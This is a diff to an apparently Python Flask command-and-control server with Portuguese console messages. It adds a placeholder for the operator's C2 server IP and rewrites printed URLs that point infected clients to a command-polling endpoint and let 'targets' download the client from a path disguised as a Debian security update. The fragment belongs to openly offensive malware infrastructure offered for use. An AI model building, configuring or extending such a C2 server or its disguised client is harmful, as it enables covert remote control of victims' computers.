@@ -10,6 +10,7 @@ app = Flask(__name__)
 
 HOST = "0.0.0.0"
 PORT = 80
+C2_IP = "{C2_IP}" # Replace with your C2 server IP
 
 def clear_terminal():
     os.system('clear')
@@ -108,8 +109,8 @@ def server():
     clear_terminal()
 
     print("[+] Servidor de Comando e Controle está rodando...")
-    print(f"[+] Cliente buscará comandos em http://{HOST}:{PORT}/loopback (POST)")
-    print(f"[+] Alvos podem baixar o cliente em http://{HOST}:{PORT}/security_debian_x386")
+    print(f"[+] Cliente buscará comandos em http://{C2_IP}:{PORT}/loopback (POST)")
+    print(f"[+] Alvos podem baixar o cliente em http://{C2_IP}:{PORT}/security_debian_x386")
 
     operator_command_interface()
 
